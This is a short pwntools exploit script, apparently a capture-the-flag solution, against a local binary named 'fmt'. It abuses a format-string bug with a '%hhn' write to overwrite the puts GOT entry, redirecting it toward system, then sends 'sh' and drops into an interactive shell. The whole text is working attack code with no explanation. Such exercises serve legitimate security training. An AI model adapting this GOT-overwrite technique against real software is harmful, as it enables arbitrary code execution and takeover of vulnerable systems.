from pwn import *

context.arch = 'amd64'

r = process("./fmt")
raw_input()

puts_got = 0x403318
system_plt = 0x401090

r.sendafter("Give me fmt: ", b"%144c%8$hhn" + b"aaaaa" + p64(puts_got))
r.sendafter("Give me string: ", "sh\x00")

r.interactive()
